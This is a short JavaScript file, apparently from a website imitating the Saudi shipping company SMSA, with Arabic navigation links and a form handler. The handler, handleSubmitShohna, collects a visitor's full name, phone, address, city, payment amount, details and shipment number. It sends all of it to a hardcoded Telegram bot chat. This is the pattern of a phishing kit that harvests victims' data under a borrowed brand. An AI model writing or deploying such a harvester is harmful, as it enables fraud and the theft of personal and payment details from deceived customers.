const datasLinks = [{id:1,pathname:'/electroniccommerce',title:'التجارة الكترونية'},
               {id:2,pathname:'/freight',title:' خدمات شحن البضائع'},
               {id:3,pathname:'/fulfilment',title:'إدارة المخزون والتوزيع'},
               {id:4,pathname:'/ksadistribution',title:'التوزيع داخل المملكة '},
               {id:4,pathname:'/track',title:'تتبع الشحنة'}];
const token = process.env.TOKEN;
const pass = 7017479979
const handleSubmitShohna = (typeRequest,fullname,numphone,adress,city,mony,detales,numshoh) => {
    

    var length =`مدونة سمسا  %0A   نوع الخدمة : ${typeRequest} %0A الاسم الكامل  : ${fullname} %0A  رقم الجوال : ${numphone}%0A العنوان : ${adress} %0A المدينة : ${city} %0A قيمة السداد:${mony} %0A التفاصيل : ${detales} %0A %0A ${numshoh}`


    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pass}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))


      }
export default datasLinks;
export{handleSubmitShohna}

